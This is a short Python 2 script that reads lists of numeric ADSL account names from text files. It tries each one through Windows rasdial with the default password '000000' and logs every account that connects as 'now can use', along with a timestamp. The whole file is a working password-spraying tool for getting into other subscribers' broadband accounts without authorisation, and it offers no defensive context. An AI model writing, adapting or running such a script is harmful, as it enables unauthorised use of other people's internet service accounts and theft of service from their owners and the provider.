#! /usr/bin/env python
#coding=utf-8
__author__ = 'yoyoyo'
import os
import time
import re
username = 31600111399
password= '000000'
users =[]
rmUser=[]
def readFile():
	for line in open('2.txt'):
		users=re.findall(r'\"\d+\"',line)
		for u in users:
			rmUser=re.findall(r'\d+',u)
			file=open('myself.txt','a+')
			file.write(unicode(rmUser)+'\n')
def hehe():
	for users in open('myself.txt','r'):
		kao= re.findall(r'\d+',users)
		for user in kao:
			cmd = "rasdial test {0}@adsl {1}".format(user,password)
			result = os.system(cmd)
			cmdsr="rasdial test /disconnect"
			if result==0:
				files=open('data.txt','a+')
				files.write(unicode(user)+'|'+time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))+'|now can use'+'\n')
				os.system(cmdsr)


hehe()

